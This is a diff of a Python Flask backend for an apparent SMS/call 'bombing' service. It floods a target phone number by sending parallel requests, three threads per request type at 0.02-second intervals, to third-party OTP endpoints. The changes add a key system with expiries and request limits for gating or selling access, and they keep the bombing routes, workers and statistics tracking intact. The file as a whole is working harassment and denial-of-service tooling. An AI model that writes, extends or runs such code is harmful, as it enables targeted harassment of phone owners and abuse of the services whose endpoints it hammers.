@@ -6,8 +6,10 @@ import time
 import random
 import threading
 import requests as req_lib
-from datetime import datetime
+from datetime import datetime, timedelta
 from bs4 import BeautifulSoup
+import hashlib
+import re
 
 app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
 CORS(app)
@@ -17,65 +19,66 @@ REQUESTS_FILE = 'requests/requests.json'
 STATS_FILE = 'requests/stats.json'
 KEYS_FILE = 'requests/keys.json'
 LOGS_FILE = 'requests/logs.json'
+HISTORY_FILE = 'requests/history.json'
 
 # ===== LOAD DATA =====
-def load_requests():
+def load_json(file, default):
     try:
-        with open(REQUESTS_FILE, 'r') as f:
+        with open(file, 'r') as f:
             return json.load(f)
     except:
-        return []
+        return default
 
-def save_stats(data):
+def save_json(file, data):
     try:
-        with open(STATS_FILE, 'w') as f:
+        os.makedirs(os.path.dirname(file), exist_ok=True)
+        with open(file, 'w') as f:
             json.dump(data, f, indent=2)
     except:
         pass
 
-def load_stats():
-    try:
-        with open(STATS_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
-
-def load_keys():
-    try:
-        with open(KEYS_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_keys(data):
-    try:
-        with open(KEYS_FILE, 'w') as f:
-            json.dump(data, f, indent=2)
-    except:
-        pass
-
-def load_logs():
-    try:
-        with open(LOGS_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return []
-
-def save_logs(data):
-    try:
-        with open(LOGS_FILE, 'w') as f:
-            json.dump(data[-100:], f, indent=2)  # Keep last 100
-    except:
-        pass
+requests_data = load_json(REQUESTS_FILE, [])
+stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
+keys_data = load_json(KEYS_FILE, {})
+logs_data = load_json(LOGS_FILE, [])
+history_data = load_json(HISTORY_FILE, [])
 
 # ===== GLOBALS =====
-requests_data = load_requests()
-stats_data = load_stats()
-keys_data = load_keys()
-logs_data = load_logs()
 bombing_active = False
 bombing_threads = []
 bombing_lock = threading.Lock()
+KEY_USAGE = {}  # Track key usage in memory
+
+# ===== KEY VALIDATION =====
+def validate_key(key):
+    if key not in keys_data:
+        return False, "Key not found"
+    
+    key_info = keys_data[key]
+    
+    # Check expiry
+    if key_info.get('expiry_time'):
+        expiry = datetime.fromisoformat(key_info['expiry_time'])
+        if datetime.now() > expiry:
+            return False, "Key expired"
+    
+    # Check request limit
+    if key_info.get('request_limit', 0) > 0:
+        used = KEY_USAGE.get(key, 0)
+        if used >= key_info['request_limit']:
+            return False, "Request limit exceeded"
+    
+    return True, "Valid"
+
+def increment_key_usage(key):
+    KEY_USAGE[key] = KEY_USAGE.get(key, 0) + 1
+    # Save usage to history
+    history_data.append({
+        "key": key,
+        "time": datetime.now().isoformat(),
+        "total_usage": KEY_USAGE[key]
+    })
+    save_json(HISTORY_FILE, history_data[-1000:])  # Keep last 1000
 
 # ===== PANSHO SESSION =====
 def get_pansho_session():
@@ -144,24 +147,24 @@ def send_request(req, phone):
             stats_data['total_requests'] += 1
             if r.status_code in [200, 302, 201, 202]:
                 stats_data['success'] += 1
-                save_stats(stats_data)
+                save_json(STATS_FILE, stats_data)
                 return True
             elif r.status_code == 429:
                 stats_data['rate_limited'] += 1
-                save_stats(stats_data)
+                save_json(STATS_FILE, stats_data)
                 return False
             else:
                 stats_data['failed'] += 1
-                save_stats(stats_data)
+                save_json(STATS_FILE, stats_data)
                 return False
     except Exception as e:
         with bombing_lock:
             stats_data['total_requests'] += 1
             stats_data['failed'] += 1
-            save_stats(stats_data)
+            save_json(STATS_FILE, stats_data)
         return False
 
-# ===== PARALLEL BOMBING WORKER =====
+# ===== BOMBING WORKER =====
 def bombing_worker(phone, req, thread_id):
     global bombing_active
     phone_variants = req.get('phones', [phone])
@@ -172,7 +175,6 @@ def bombing_worker(phone, req, thread_id):
         target_phone = random.choice(phone_variants)
         success = send_request(req, target_phone)
         
-        # Log
         with bombing_lock:
             log_entry = {
                 "time": datetime.now().isoformat(),
@@ -182,9 +184,8 @@ def bombing_worker(phone, req, thread_id):
                 "thread": thread_id
             }
             logs_data.append(log_entry)
-            save_logs(logs_data)
+            save_json(LOGS_FILE, logs_data[-500:])
         
-        # Ultra fast: 0.02 sec = 3000 req/min per thread
         time.sleep(0.02)
 
 # ===== ROUTES =====
@@ -207,34 +208,154 @@ def get_stats():
         "usage": stats_data
     })
 
+# ===== KEYS =====
 @app.route('/api/keys', methods=['GET'])
 def get_keys():
-    return jsonify(keys_data)
+    # Return keys with usage
+    keys_with_usage = {}
+    for k, v in keys_data.items():
+        keys_with_usage[k] = {
+            **v,
+            "used": KEY_USAGE.get(k, 0),
+            "remaining": v.get('request_limit', 0) - KEY_USAGE.get(k, 0) if v.get('request_limit', 0) > 0 else "Unlimited"
+        }
+    return jsonify(keys_with_usage)
 
 @app.route('/api/keys', methods=['POST'])
 def generate_key():
     data = request.json
-    key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
+    custom_key = data.get('custom_key', '').strip()
+    
+    # If custom key provided, validate and use it
+    if custom_key:
+        # Validate custom key format (alphanumeric + underscore)
+        if not re.match(r'^[a-zA-Z0-9_]{8,32}$', custom_key):
+            return jsonify({"error": "Key must be 8-32 characters, alphanumeric or underscore"}), 400
+        if custom_key in keys_data:
+            return jsonify({"error": "Key already exists"}), 400
+        key = custom_key
+    else:
+        # Generate random key
+        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24))
+        # Ensure it doesn't conflict
+        while key in keys_data:
+            key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24))
+    
+    # Parse expiry
+    expiry_type = data.get('expiry_type', 'unlimited')
+    expiry_time = None
+    if expiry_type == 'time':
+        duration = data.get('duration', 3600)
+        expiry_time = (datetime.now() + timedelta(seconds=duration)).isoformat()
+    elif expiry_type == 'date':
+        date_str = data.get('expiry_date')
+        if date_str:
+            try:
+                expiry_time = datetime.fromisoformat(date_str).isoformat()
+            except:
+                return jsonify({"error": "Invalid date format. Use YYYY-MM-DDTHH:MM:SS"}), 400
+    
+    # Parse request limit
+    request_limit = data.get('request_limit', 0)
+    if request_limit:
+        try:
+            request_limit = int(request_limit)
+        except:
+            request_limit = 0
+    
+    # Create key info
     keys_data[key] = {
+        "name": data.get('name', 'Unnamed Key'),
         "created": datetime.now().isoformat(),
-        "expiry": data.get('expiry', 3600),
-        "name": data.get('name', 'Unnamed')
+        "expiry_type": expiry_type,
+        "expiry_time": expiry_time,
+        "request_limit": request_limit,
+        "used": 0
     }
-    save_keys(keys_data)
-    return jsonify({"success": True, "key": key})
+    save_json(KEYS_FILE, keys_data)
+    
+    # Add to history
+    history_data.append({
+        "key": key,
+        "action": "created",
+        "name": data.get('name', 'Unnamed Key'),
+        "time": datetime.now().isoformat(),
+        "expiry_type": expiry_type,
+        "request_limit": request_limit
+    })
+    save_json(HISTORY_FILE, history_data[-1000:])
+    
+    return jsonify({
+        "success": True,
+        "key": key,
+        "info": keys_data[key]
+    })
+
+@app.route('/api/keys/<key>', methods=['PUT'])
+def update_key(key):
+    if key not in keys_data:
+        return jsonify({"error": "Key not found"}), 404
+    
+    data = request.json
+    # Update allowed fields
+    if 'name' in data:
+        keys_data[key]['name'] = data['name']
+    if 'request_limit' in data:
+        keys_data[key]['request_limit'] = int(data['request_limit'])
+    if 'expiry_time' in data:
+        keys_data[key]['expiry_time'] = data['expiry_time']
+    
+    save_json(KEYS_FILE, keys_data)
+    return jsonify({"success": True, "key": key, "info": keys_data[key]})
 
 @app.route('/api/keys/<key>', methods=['DELETE'])
 def revoke_key(key):
     if key in keys_data:
         del keys_data[key]
-        save_keys(keys_data)
+        save_json(KEYS_FILE, keys_data)
+        history_data.append({
+            "key": key,
+            "action": "revoked",
+            "time": datetime.now().isoformat()
+        })
+        save_json(HISTORY_FILE, history_data[-1000:])
         return jsonify({"success": True})
     return jsonify({"success": False}), 404
 
+@app.route('/api/keys/<key>/copy', methods=['GET'])
+def copy_key(key):
+    if key not in keys_data:
+        return jsonify({"error": "Key not found"}), 404
+    return jsonify({
+        "key": key,
+        "info": keys_data[key],
+        "full_key": key
+    })
+
+@app.route('/api/keys/history', methods=['GET'])
+def get_key_history():
+    return jsonify(history_data[-200:])  # Last 200 history entries
+
+@app.route('/api/keys/usage', methods=['GET'])
+def get_key_usage():
+    # Aggregate usage
+    usage = {}
+    for entry in history_data:
+        key = entry.get('key')
+        if key and key in keys_data:
+            if key not in usage:
+                usage[key] = 0
+            if entry.get('action') == 'used':
+                usage[key] += 1
+    return jsonify(usage)
+
+# ===== LOGS =====
 @app.route('/api/logs', methods=['GET'])
 def get_logs():
-    return jsonify(logs_data[-50:])  # Last 50 logs
+    limit = request.args.get('limit', 50, type=int)
+    return jsonify(logs_data[-limit:])
 
+# ===== BOMBING =====
 @app.route('/api/bomb/start', methods=['POST'])
 def start_bombing():
     global bombing_active, bombing_threads, stats_data
@@ -244,11 +365,19 @@ def start_bombing():
     if not phone:
         return jsonify({"error": "Phone number required"}), 400
     
+    # Validate API key if provided
+    api_key = data.get('api_key') or request.headers.get('X-API-Key')
+    if api_key:
+        valid, msg = validate_key(api_key)
+        if not valid:
+            return jsonify({"error": msg}), 401
+        increment_key_usage(api_key)
+    
     if bombing_active:
         return jsonify({"error": "Bombing already active"}), 400
     
     stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
-    save_stats(stats_data)
+    save_json(STATS_FILE, stats_data)
     
     bombing_active = True
     bombing_threads = []
@@ -256,8 +385,7 @@ def start_bombing():
     active_requests = [r for r in requests_data if r.get('active', True)]
     thread_id = 0
     for req in active_requests:
-        # 3 parallel threads per request type for insane speed
-        for _ in range(3):
+        for _ in range(3):  # 3 threads per request
             t = threading.Thread(target=bombing_worker, args=(phone, req, thread_id))
             t.daemon = True
             t.start()
